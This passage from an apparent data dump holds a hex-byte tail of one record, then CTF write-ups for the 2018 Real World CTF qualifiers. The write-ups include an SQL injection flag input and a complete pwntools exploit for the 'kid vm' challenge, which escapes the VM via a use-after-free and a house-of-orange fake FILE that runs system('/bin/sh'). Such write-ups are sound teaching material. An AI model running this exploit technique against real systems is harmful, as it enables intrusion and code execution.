53:6a:07:11:1b:0a:1e:48:0e:13:11:07:07:00:18:7b:2b:49:5e:4b:2a:c0:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00\n02:00:54:42:53:6a:07:11:1b:0a:1e:48:0e:13:11:07:07:00:18:7b:2b:49:5e:4b:ea:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00\n02:00:54:42:53:6a:07:11:1b:0a:1e:48:0e:13:11:07:07:00:18:7b:2b:49:5e:cb:2a:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00\n02:00:54:42:53:6a:07:11:1b:0a:1e:48:0e:13:11:07:07:00:18:7b:2b:49:de:4b:2a:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00\n02:00:54:42:53:6a:07:11:1b:0a:1e:48:0e:13:11:07:07:00:18:7b:2b:c9:5e:4b:2a:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00\n02:00:54:42:53:6a:07:11:1b:0a:1e:48:0e:13:11:07:07:00:18:7b:2b:00:c9:5e:4b:2a:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00\n02:00:54:42:53:6a:07:11:1b:0a:1e:48:0e:13:11:07:07:00:18:7b:2b:00:49:de:4b:2a:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00\n02:00:54:42:53:6a:07:11:1b:0a:1e:48:0e:13:11:07:07:00:18:7b:2b:00:49:5e:cb:2a:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00\n02:00:54:42:53:6a:07:11:1b:0a:1e:48:0e:13:11:07:07:00:18:7b:2b:00:49:5e:4b:ea:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00\n02:00:54:42:53:6a:07:11:1b:0a:1e:48:0e:13:11:07:07:00:18:7b:2b:00:49:5e:4b:2a:c0:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00\n02:00:54:42:53:6a:07:11:1b:0a:1e:48:0e:13:11:07:07:00:18:7b:2b:00:49:5e:4b:2a:13:c0:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00\n02:00:54:42:53:6a:07:11:1b:0a:1e:48:0e:13:11:07:07:00:18:7b:2b:00:49:5e:4b:2a:13:2e:c0:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00\n02:00:54:42:53:6a:07:11:1b:0a:1e:48:0e:13:11:07:07:00:18:7b:2b:00:49:5e:4b:2a:13:2e:19:c0:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00\n02:00:54:42:53:6a:07:11:1b:0a:1e:48:0e:13:11:07:07:00:18:7b:2b:00:49:5e:4b:2a:13:2e:19:11:c0:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00\n02:00:54:42:53:6a:07:11:1b:0a:1e:48:0e:13:11:07:07:00:18:7b:2b:00:49:5e:4b:2a:13:2e:19:d1:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00\n02:00:54:42:53:6a:07:11:1b:0a:1e:48:0e:13:11:07:07:00:18:7b:2b:00:49:5e:4b:2a:13:2e:d9:11:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00\n02:00:54:42:53:6a:07:11:1b:0a:1e:48:0e:13:11:07:07:00:18:7b:2b:00:49:5e:4b:2a:13:d9:11:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00\n02:00:54:42:53:6a:07:11:1b:0a:1e:48:0e:13:11:07:07:00:18:7b:2b:00:49:5e:4b:2a:13:2e:d9:11:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00\n02:00:54:42:53:6a:07:11:1b:0a:1e:48:0e:13:11:07:07:00:18:7b:2b:00:49:5e:4b:2a:13:d9:11:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00\n02:00:54:42:53:6a:07:11:1b:0a:1e:48:0e:13:11:07:07:00:18:7b:2b:00:49:5e:4b:2a:13:02:d9:11:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00\n02:00:54:42:53:6a:07:11:1b:0a:1e:48:0e:13:11:07:07:00:18:7b:2b:00:49:5e:4b:2a:13:02:19:d1:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00\n02:00:54:42:53:6a:07:11:1b:0a:1e:48:0e:13:11:07:07:00:18:7b:2b:00:49:5e:4b:2a:13:02:19:11:c0:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00\n02:00:54:42:53:6a:07:11:1b:0a:1e:48:0e:13:11:07:07:00:18:7b:2b:00:49:5e:4b:2a:13:02:19:11:38:c0:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00\n02:00:54:42:53:6a:07:11:1b:0a:1e:48:0e:13:11:07:07:00:18:7b:2b:00:49:5e:4b:2a:13:02:19:11:38:01:c0:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00\n02:00:54:42:53:6a:07:11:1b:0a:1e:48:0e:13:11:07:07:00:18:7b:2b:00:49:5e:4b:2a:13:02:19:11:38:01:1d:c0:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00\n02:00:54:42:53:6a:07:11:1b:0a:1e:48:0e:13:11:07:07:00:18:7b:2b:00:49:5e:4b:2a:13:02:19:11:38:01:1d:19:c0:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00\n02:00:54:42:53:6a:07:11:1b:0a:1e:48:0e:13:11:07:07:00:18:7b:2b:00:49:5e:4b:2a:13:02:19:11:38:01:1d:19:38:c0:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00\n02:00:54:42:53:6a:07:11:1b:0a:1e:48:0e:13:11:07:07:00:18:7b:2b:00:49:5e:4b:2a:13:02:19:11:38:01:1d:19:38:0e:c0:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00\n02:00:54:42:53:6a:07:11:1b:0a:1e:48:0e:13:11:07:07:00:18:7b:2b:00:49:5e:4b:2a:13:02:19:11:38:01:1d:19:38:0e:3c:c0:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00\n02:00:54:42:53:6a:07:11:1b:0a:1e:48:0e:13:11:07:07:00:18:7b:2b:00:49:5e:4b:2a:13:02:19:11:38:01:1d:19:38:0e:3c:3c:c0:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00\n02:00:54:42:53:6a:07:11:1b:0a:1e:48:0e:13:11:07:07:00:18:7b:2b:00:49:5e:4b:2a:13:02:19:11:38:01:1d:19:38:0e:3c:c0:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00\n02:00:54:42:53:6a:07:11:1b:0a:1e:48:0e:13:11:07:07:00:18:7b:2b:00:49:5e:4b:2a:13:02:19:11:38:01:1d:19:38:0e:c0:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00\n02:00:54:42:53:6a:07:11:1b:0a:1e:48:0e:13:11:07:07:00:18:7b:2b:00:49:5e:4b:2a:13:02:19:11:38:01:1d:19:38:0e:12:c0:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00\n02:00:54:42:53:6a:07:11:1b:0a:1e:48:0e:13:11:07:07:00:18:7b:2b:00:49:5e:4b:2a:13:02:19:11:38:01:1d:19:38:0e:12:12:c0:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00\n02:00:54:42:53:6a:07:11:1b:0a:1e:48:0e:13:11:07:07:00:18:7b:2b:00:49:5e:4b:2a:13:02:19:11:38:01:1d:19:38:0e:12:12:05:c0:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00\n02:00:54:42:53:6a:07:11:1b:0a:1e:48:0e:13:11:07:07:00:18:7b:2b:00:49:5e:4b:2a:13:02:19:11:38:01:1d:19:38:0e:12:12:05:3b:c0:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00\n02:00:54:42:53:1d:15:1e:00:01:1d:00:41:5e:24:4e:4f:4a:06:00:1e:11:2d:1e:00:3a:0a:19:1b:11:1e:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00", "timestamp": "2025-10-24T11:39:03.420863"}
{"source": "github", "repo": "Aurel300/empirectf", "file": "writeups/2018-07-28-Real-World-CTF-Quals/README.md", "url": "https://github.com/EmpireCTF/empirectf/blob/master/writeups/2018-07-28-Real-World-CTF-Quals/README.md", "content": "# 2018-07-28-Real-World-CTF-Quals #\n\n[CTFTime link](https://ctftime.org/event/645) | [Website](https://realworldctf.com/)\n\n---\n\n## Challenges ##\n\n### Blockchain ###\n\n - [ ] 378 MultiSigWallet\n\n### Check-in ###\n\n - [x] [66 advertisement](#66-check-in--advertisement)\n\n### Forensics ###\n\n - [x] [146 ccls-fringe](#146-forensics--ccls-fringe)\n\n### Pwn ###\n\n - [ ] 500 SCSI\n - [ ] 425 doc2own\n - [ ] 451 state-of-the-art vm\n - [ ] 500 Spectre-Free\n - [x] [188 kid vm](#188-pwn--kid-vm)\n - [ ] 477 P90 RUSH B\n - [ ] 451 untrustworthy\n\n### Web ###\n\n - [ ] 500 PrintMD\n - [x] [105 dot free](#105-web--dot-free)\n - [ ] 208 bookhub\n\n---\n\n## 66 Check-in / advertisement ##\n\n**Description**\n\n> This platform is under protection. DO NOT hack it.\n\n**No files provided**\n\n**Solution**\n\nThis was the check-in challenge for this CTF, which usually means \"look for the flag in the IRC channel\". But in this case the flag was nowhere to be found, neither in the IRC nor in the rules, nor in the webpage comments.\n\nMy teammate heard that the advertisement is in some way related to CloudFlare, and the CTF website was indeed protected by CloudFlare. I spent some time looking for something interesting in the WHOIS information, or something related to CF status reports, but to no avail.\n\nThe very first thing I tried with this challenge was actually to input `\" OR 1 == 1 -- ` as the flag, and doing this redirected me to a login page. I did not think much of it, but I was never logged off, and inputting a wrong flag in the other challenges did not redirect - it simply flashed a \"Wrong flag\" message.\n\nAfter entering a wrong flag for a different challenge for the first time, I realised this and came back to this challenge. Once again I input the SQL injection and looked in the HTML comments in the login form, and the flag was there!\n\n`rwctf{SafeLine_1s_watch1ng_uuu}`\n\n## 146 Forensics / ccls-fringe ##\n\n**Description**\n\n> Ray said that the challenge \"Leaf-Similar Trees\" from last LeetCode Weekly was really same-fringe problem and wrote it in the form of coroutine which he learned from a Stanford friend. Can you decrypt the cache file dumped from a language server without reading the source code? The flag is not in the form of rwctf{} because special characters cannot be used.\n\n**Files provided**\n\n - [ccls-fringe.tar.xz](https://s3-us-west-1.amazonaws.com/realworldctf/ccls-fringe.tar.xz)\n\n**Solution**\n\nFirst let's examine the contents of the archive:\n\n    $ tar xzfv ccls-fringe.tar.xz\n    x .ccls-cache/\n    x .ccls-cache/@home@flag@/\n    x .ccls-cache/@home@flag@/fringe.cc.blob\n    $ xxd .ccls-cache/\\@home\\@flag\\@/fringe.cc.blob | head\n    0000000: 2202 ff00 5832 c065 8487 2a04 002f 686f  \"...X2.e..*../ho\n    0000010: 6d65 2f66 6c61 672f 6672 696e 6765 2e63  me/flag/fringe.c\n    0000020: 6300 0225 636c 616e 6700 2f68 6f6d 652f  c..%clang./home/\n    0000030: 666c 6167 2f66 7269 6e67 652e 6363 00a9  flag/fringe.cc..\n    0000040: 2f75 7372 2f69 6e63 6c75 6465 2f63 2b2b  /usr/include/c++\n    0000050: 2f38 2e31 2e31 2f65 7874 2f61 746f 6d69  /8.1.1/ext/atomi\n    0000060: 6369 7479 2e68 00ff 007c 5bae 8205 682a  city.h...|[...h*\n    0000070: 2f75 7372 2f69 6e63 6c75 6465 2f61 736d  /usr/include/asm\n    0000080: 2d67 656e 6572 6963 2f65 7272 6e6f 2e68  -generic/errno.h\n    0000090: 00ff 0008 b092 b81c 472a 2f75 7372 2f69  ........G*/usr/i\n\n([full fringe.cc.blob file](scripts/fringe.cc.blob))\n\nThe `.blob` file contains a lot of C++ library names, and even some fragments of code. But clearly it is not a source code file, nor an executable. With some googling ([`ccls-cache format`](https://github.com/MaskRay/ccls/wiki/Initialization-options)) we can easily find what this cache system is – it is a file created by [`ccls`](https://github.com/MaskRay/ccls/). The documentation mentions there are two serialisation formats, JSON and binary, but it doesn't really go into the specifics of the binary format. However, after some skimming through the repository, we can find the [key files](https://github.com/MaskRay/ccls/tree/master/src/serializers) for the actual serialisation formats.\n\nThese essentially only specify how to encode various primitives and standard library types, but the meat of the process, i.e. destructuring the classes used internally ba `ccls` is done [here](https://github.com/MaskRay/ccls/blob/master/src/serializer.cc). In particular:\n\n    std::string Serialize(SerializeFormat format, IndexFile& file) {\n      switch (format) {\n        case SerializeFormat::Binary: {\n          BinaryWriter writer;\n          int major = IndexFile::kMajorVersion;\n          int minor = IndexFile::kMinorVersion;\n          Reflect(writer, major);\n          Reflect(writer, minor);\n          Reflect(writer, file);\n          return writer.Take();\n        }\n      // ...\n    }\n\nAnd the actual `IndexFile`:\n\n    // IndexFile\n    bool ReflectMemberStart(Writer& visitor, IndexFile& value) {\n      visitor.StartObject();\n      return true;\n    }\n    template <typename TVisitor>\n    void Reflect(TVisitor& visitor, IndexFile& value) {\n      REFLECT_MEMBER_START();\n      if (!gTestOutputMode) {\n        REFLECT_MEMBER(last_write_time);\n        REFLECT_MEMBER(language);\n        REFLECT_MEMBER(lid2path);\n        REFLECT_MEMBER(import_file);\n        REFLECT_MEMBER(args);\n        REFLECT_MEMBER(dependencies);\n      }\n      REFLECT_MEMBER(includes);\n      REFLECT_MEMBER(skipped_ranges);\n      REFLECT_MEMBER(usr2func);\n      REFLECT_MEMBER(usr2type);\n      REFLECT_MEMBER(usr2var);\n      REFLECT_MEMBER_END();\n    }\n\nWith this, we can start writing a deserialiser. It might have been faster to just clone the repo and see if it could be used to convert from the binary format into the JSON format, but I was worried the build would be problematic, since `ccls` depends on LLVM.\n\nSome more relevant source code files:\n\n - https://github.com/MaskRay/ccls/blob/master/src/indexer.h\n - https://github.com/MaskRay/ccls/blob/master/src/indexer.cc\n - https://github.com/MaskRay/ccls/blob/master/src/serializer.h\n - https://github.com/MaskRay/ccls/blob/master/src/serializer.cc\n - https://github.com/MaskRay/ccls/blob/master/src/position.h\n - https://github.com/MaskRay/ccls/blob/master/src/position.cc\n - https://github.com/cquery-project/cquery/blob/master/src/lsp.h\n - https://github.com/cquery-project/cquery/blob/master/src/symbol.h\n - https://github.com/MaskRay/ccls/blob/master/src/serializers/binary.h\n\nSo with the data deserialised, I had all the information known to the caching system, except the original source code, of course. The data includes the C++ includes, classes, functions, and variables defined in the file. One thing I noticed while writing the deserialiser is that there is a \"comments\" field in all defined members (classes, functions, variables).\n\nOne of these comments fields says `flag is here` (though this can clearly be seen in the file with a hex editor as well). With the deserialised data, we can tell which member this comment is attached to. Interestingly, it was a field called `int b` – clearly its 32-bit value cannot contain the actual flag, so what could this mean?\n\nAnother useful piece of information in the data is `spell`, presumably the place where the name of each member is initially given (i.e. declaration). `spell` includes a `range`, i.e. the line-column positions delimiting the beginning and ending of the member name.\n\nAt this point I was thinking my best bet would be to reconstruct as much of the original source code as possible from the positional data, then deduce control structures from the article mentioned in the challenge description and hope that the code somehow produces the flag.\n\nWell, in the process of doing this, I got a file that looked like this:\n\n```\n\n\n\n\n       TreeNode \n      val \n            left \n            right \n\n\n       Co \n             c \n       stack \n            ret \n  Co             link         f                               root             b \n                                                                               l \n                                                                               e \n                                                                               s \n                                                                               s \n\n\n       yield           x                                                       w \n                                                                               o \n                                                                               d \n\n\n\n     dfs     c            x                                                    w \n                                                                               h \n                                                                               o \n                                                                               i \n                                                                               s \n\n\n      Solution \n\n       leafSimilar           root1            root2                            i \n               c                                                               n \n       c2                  c1                                                  h \n                                                                               k \n\n\n\n\n\n\n\n     insert            x            y \n\n\n\n\n\n    main \n           xs \n           ys \n           zs \n            tx             ty             tz \n             x \n             y \n             z \n           s \n```\n\n([full deserialiser script](scripts/Fringe.hx))\n\nMost of it seems normal enough, but some variables in the rightmost columns spell out `bless wod whois inhk`. Clearly this wasn't a coincidence so I checked to see if this was the flag ... and sure enough, it was!\n\n`blesswodwhoisinhk`\n\n## 188 Pwn / kid vm ##\n\n**Description**\n\n> Writing a vm is the best way to teach kids to learn vm escape.\n> \n> nc 34.236.229.208 9999\n\n**Files provided**\n\n - [kid-vm.zip](https://s3-us-west-1.amazonaws.com/realworldctf/kid_vm_801180ca894848965a2d6424472e0acb.zip)\n\n**Solution**\n\nA VM escape challenge. A VM is implemented using hypervisor `/dev/kvm`. We need to escape the VM and get RCE.\n\nThe program can't be run in VM ubuntu, since there is no `/dev/kvm`.\n\nInitially, I was trying to figure out what each `ioctl` does; however, this is not useful. What we need to do is to look at how VM handles special instruction such as `in/out/vmcall` and what the guest OS does.\n\nhere is the code to handle `in` and `out`\n\n```c\ncase 2u:\n  if ( *((_BYTE *)p_vcpu + 32) == 1\n    && *((_BYTE *)p_vcpu + 33) == 1\n    && *((_WORD *)p_vcpu + 17) == 0x17\n    && *((_DWORD *)p_vcpu + 9) == 1 )\n  {\n    putchar(*((char *)p_vcpu + p_vcpu[5]));// out to print to stdout\n    continue;\n  }\n  if ( !*((_BYTE *)p_vcpu + 32)\n    && *((_BYTE *)p_vcpu + 33) == 1\n    && *((_WORD *)p_vcpu + 17) == 23\n    && *((_DWORD *)p_vcpu + 9) == 1 )\n  {\n    read(0, (char *)p_vcpu + p_vcpu[5], 1uLL);// in to get input from stdin\n    continue;\n  }\n  fwrite(\"Unhandled IO\\n\", 1uLL, 0xDuLL, stderr);\n  return 1LL;\n```\n\nand here is the code to handle, where we do memory operation on host machine\n\n```c\nif ( vm_codes[*(_QWORD *)&regs[128]] == 0xF\n  && vm_codes[*(_QWORD *)&regs[128] + 1] == 1\n  && vm_codes[*(_QWORD *)&regs[128] + 2] == 0xC1u )\n{//0f 01 c1 is the byte code of vmcall\n  if ( ioctl(fd_vcpu, 0x8090AE81uLL, regs) == -1 )\n    puts(\"Error get regs!\");\n  switch ( *(unsigned __int16 *)regs )\n  {\n    case 0x101u:\n      free_host(*(__int16 *)&regs[8], *(unsigned __int16 *)&regs[16]);\n      break;\n    case 0x102u:\n      update_host(\n        *(__int16 *)&regs[8],\n        *(unsigned __int16 *)&regs[16],\n        *(unsigned __int16 *)&regs[24],\n        (__int64)vm_codes);\n      break;\n    case 0x100u:\n      alloc_host(*(unsigned __int16 *)&regs[8]);\n      break;\n    default:\n      puts(\"Function error!\");\n      break;\n  }\n}\n```\n\nSome of the constants of `ioctl` can't be found in IDA, I don't know why. In addition, the online resources are rare and unclear, so the relevant data structures and macros are hard to identify, and I wasted much time on looking for what each `ioctl` does. Luckily, this is not so important to solve this challenge.\n\n### guest OS arbitrary code execution\n\nThe guest OS memory is set here\n\n```c\nv13 = 0LL;\nv14 = 0LL;\nv15 = 0x10000LL;\nv16 = vm_codes;\n//vm_codes comes from data from 0x18E0\nif ( ioctl(fd_vm, 0x4020AE46uLL, &v13) == -1 )// AE46 KVM_SET_USER_MEMORY_REGION\n{\n    perror(\"Fail\");\n    return 1LL;\n}\n```\n\ndump the 896 bytes of data at 0x18e0 and add some 0 to make binary file page aligned(because the program uses memory after 896 as global variables), analyze using 16 bits real-mode assembly. The reason is when a CPU starts, the mode is initially 16 bits real mode.\n\nAnd this is quite clear, the host memory allocation is implemented using `vmcall`; input and output are also implemented using `in` and `out`. They are all handled by the VM program when these instruction are being executed.\n\nNormal memory allocation starts at 0x5000\n\n```assembly\n89 CF       mov     di, cx          ; actual allocation\n81 C1 00 50 add     cx, 5000h\n01 F6       add     si, si\n89 8C 46 03 mov     ds:mems[si], cx\n89 84 66 03 mov     ds:sizes[si], ax\n01 C7       add     di, ax\n89 3E 44 03 mov     ds:next_alloc, di\nA0 42 03    mov     al, ds:num_of_mem\nFE C0       inc     al\nA2 42 03    mov     ds:num_of_mem, al\nEB 1F       jmp     short loc_E1\n;codes from alloc_6f\n```\n\nThe size limitation for each chunk is 0x1000\n\n```assembly\nA1 40 03    mov     ax, ds:alloc_size\n3D 00 10    cmp     ax, 1000h\n77 33       ja      short loc_C2\n```\n\nThe max bound is 0xb000\n\n```assembly\n8B 0E 44 03 mov     cx, ds:next_alloc\n81 F9 00 B0 cmp     cx, 0B000h\n77 34       ja      short loc_CD\n```\n\nHowever, this is problematic, if we alloc `0xb000 + 0x5000 = 0x10000`, which becomes `0x0000` due to overflow, and the codes of program is here! So we can write to codes and get arbitrary code execution. \n\nPS: in 16 bits real mode, there is no such thing as RWX attribute of pages.\n\nTo test our idea, we can write `0x0000-0x1000` to `hlt` or `int3`, and it is clear that the reaction is different.\n\n### VM escape\n\nin free host, there is a UAF\n\n```c\nvoid __fastcall free_host(__int16 a1, unsigned __int16 a2)\n{\n  if ( a2 <= 0x10u )\n  {\n    switch ( a1 )\n    {\n      case 2:\n        free((void *)buf[a2]);\n        buf[a2] = 0LL;\n        --dword_20304C;\n        break;\n      case 3:\n        free((void *)buf[a2]);\n        buf[a2] = 0LL;\n        sizes[a2] = 0;\n        --dword_20304C;\n        break;\n      case 1:\n        free((void *)buf[a2]);                  // UAF & double free\n        break;\n    }\n  }\n  else\n  {\n    perror(\"Index out of bound!\");\n  }\n}\n```\n\nHowever, this will not be executed if we don't have arbitrary code execution in guest OS, since only case 3 will be called by vmcall in guest OS.\n\n```assembly\n68 00 01    push    100h\n9D          popf\nB8 01 01    mov     ax, 101h\nBB 03 00    mov     bx, 3\n8A 0E 43 03 mov     cl, ds:idx\n0F 01 C1    vmcall\n```\n\nalso, in update, there is an operation for us to leak libc, case 2\n\n```c\nvoid __fastcall update_host(__int16 a1, unsigned __int16 a2, unsigned __int16 a3, __int64 a4)\n{\n  if ( a2 <= 0x10u )\n  {\n    if ( buf[a2] )\n    {\n      if ( (unsigned int)a3 <= sizes[a2] )\n      {\n        if ( a1 == 1 )\n        {\n          memcpy((void *)buf[a2], (const void *)(a4 + 0x4000), a3);\n        }\n        else if ( a1 == 2 )\n        {\n          memcpy((void *)(a4 + 0x4000), buf[a2], a3);\n        }\n      }\n        //....\n```\n\nSimilarly, this will not be called unless we get arbitrary code execution in guest OS.\n\nTherefore, the vuln is UAF with `0x80 <= size <= 0x1000`, we can use house of orange to exploit it.\n\nThe way to exploit is not hard, just regard it as a normal pwn, I will not explain this in detail.\n\nThe exploit is \n\n```python\nfrom pwn import *\n\ng_local=False\ne=ELF('./libc-2.23.so')\ncontext.log_level='debug'\nUPDATE_RET_ADDR = 0x122\nLAST_ALLOC_SIZE = 0x1F3\nIO_STR_FINISH = 0x3c37b0\nUNSORT_OFF = 0x7f603f138b78 - 0x7f603ed74000\nif g_local:\n\tsh = process('./kidvm')#, env={'LD_PRELOAD':'./libc-2.23.so'})\n\t#gdb.attach(sh)\nelse:\n\tsh = remote(\"34.236.229.208\", 9999)\n\n\ndef alloc(size):\n\tsh.send(\"1\")\n\tsh.recvuntil(\"Size:\")\n\tsh.send(p16(size))\n\tsh.recvuntil(\"Your choice:\")\n\ndef update(idx, content):\n\tsh.send(\"2\")\n\tsh.recvuntil(\"Index:\")\n\tsh.send(chr(idx))\n\tsh.recvuntil(\"Content:\")\n\tsh.send(content)\n\t#sh.recvuntil(\"Your choice:\")\n\ndef alloc_host(size):\n\tpush_0x100_popf = \"\\x68\\x00\\x01\\x9D\"\n\t# forgot this initially, stuck for 1 hours :(\n\tmov_ax = \"\\xB8\" + p16(0x100)\n\tmov_bx = \"\\xBB\" + p16(size)\n\tvmcall = \"\\x0f\\x01\\xc1\"\n\treturn push_0x100_popf + mov_bx + mov_ax + vmcall\n\ndef update_host(size, idx, bx):\n\tpush_0x100_popf = \"\\x68\\x00\\x01\\x9D\"\n\tmov_ax = \"\\xB8\" + p16(0x102)\n\tmov_bx = \"\\xBB\" + p16(bx)\n\tmov_cx = \"\\xB9\" + p16(idx)\n\tmov_dx = \"\\xBA\" + p16(size)\n\tvmcall = \"\\x0f\\x01\\xc1\"\n\treturn push_0x100_popf + mov_ax + mov_bx + mov_cx + mov_dx + vmcall\n\ndef free_host(idx):\n\tpush_0x100_popf = \"\\x68\\x00\\x01\\x9D\"\n\tmov_ax = \"\\xB8\" + p16(0x101)\n\tmov_bx = \"\\xBB\" + p16(1) # 1 will cause UAF\n\tmov_cx = \"\\xB9\" + p16(idx)\n\tvmcall = \"\\x0f\\x01\\xc1\"\n\treturn push_0x100_popf + mov_ax + mov_bx + mov_cx + vmcall\n\ndef write_stdout(addr, size, ip):\n\tmov_ax = \"\\xB8\" + p16(addr)\n\tmov_bx = \"\\xBB\" + p16(size)\n\tcall = \"\\xE8\" + p16(0x1f3 - (ip + len(mov_ax + mov_bx) + 3))\n\treturn mov_ax + mov_bx + call\n\ndef read_stdin(addr, size, ip):\n\tmov_ax = \"\\xB8\" + p16(addr)\n\tmov_bx = \"\\xBB\" + p16(size)\n\tcall = \"\\xE8\" + p16(0x205 - (ip + len(mov_ax + mov_bx) + 3))\n\treturn mov_ax + mov_bx + call\n\nsh.recvuntil(\"Your choice:\")\n\nfor i in xrange(0,0xb):\n\talloc(0x1000)\nalloc(LAST_ALLOC_SIZE)\n#now edit 0xb to write code segment of guest OS\n\nshellcode = alloc_host(0x80) #0\nshellcode += alloc_host(0x80) #1\nshellcode += free_host(0)\nshellcode += update_host(8, 0, 2)\nshellcode += write_stdout(0x4000, 8, len(shellcode) + UPDATE_RET_ADDR)\nshellcode += free_host(1) #consolidate\nshellcode += alloc_host(0x90) #2\nshellcode += alloc_host(0x200) #3 edit 1 to edit this chunk header\nrec = len(shellcode)\nshellcode += alloc_host(0x80) #4 prevent consolidate\nshellcode += free_host(3)\nshellcode += read_stdin(0x4000, 0x10, len(shellcode) + UPDATE_RET_ADDR)\nshellcode += update_host(0x10, 1, 1)\nshellcode += read_stdin(0x4000, 0xE0, len(shellcode) + UPDATE_RET_ADDR)\nshellcode += update_host(0xE0, 3, 1)\n#shellcode += alloc_host(10)\nshellcode += \"\\xEB\" + chr((rec - (len(shellcode) + 2)) & 0xFF)\n\npayload = \"\\xcc\" * UPDATE_RET_ADDR\npayload += shellcode\nassert len(payload) < LAST_ALLOC_SIZE\npayload += (LAST_ALLOC_SIZE - len(payload)) * \"\\x90\"\n\nupdate(0xb, payload)\n\nlibc_addr = u64(sh.recvuntil(\"\\x00\\x00\")) - UNSORT_OFF\nprint hex(libc_addr)\n\nfake_file = p64(0)\nfake_file += p64(0x61)\nfake_file += p64(libc_addr + UNSORT_OFF)\nfake_file += p64(libc_addr + e.symbols[\"_IO_list_all\"] - 0x10)\nfake_file += p64(2) + p64(3)\nfake_file += \"\\x00\" * 8\nfake_file += p64(libc_addr + next(e.search('/bin/sh\\x00'))) #/bin/sh addr\nfake_file += (0xc0-0x40) * \"\\x00\"\nfake_file += p32(0) #mode\nfake_file += (0xd8-0xc4) * \"\\x00\"\nfake_file += p64(libc_addr + IO_STR_FINISH - 0x18) #vtable_addr\nfake_file += (0xe8-0xe0) * \"\\x00\"\nfake_file += p64(libc_addr + e.symbols[\"system\"])\n\nsh.send(fake_file[0:0x10])\nassert len(fake_file[0x10:]) == 0xE0\n\nsh.send(fake_file[0x10:])\n\nsh.interactive()\n```\n\nPS: It seems that `asm` in pwntools does not work for 16 bits assembly\n\n - [mem2019](https://github.com/mem2019)\n\n## 105 Web / dot free ##\n\n**Description**\n\n> All the IP addresses and domain names have dots, but can you hack without dot?\n> \n> http://13.57.104.34/\n\n([local copy of website](files/dotfree.html))\n\n**No files provided**\n\n**Solution**\n\nWe are presented with a simple form that asks for a URL:\n\n![](screens/dotfree.png)\n\nA lot of what we can put inside results in errors, with the website outputting simply:\n\n    {\"msg\": \"invalid 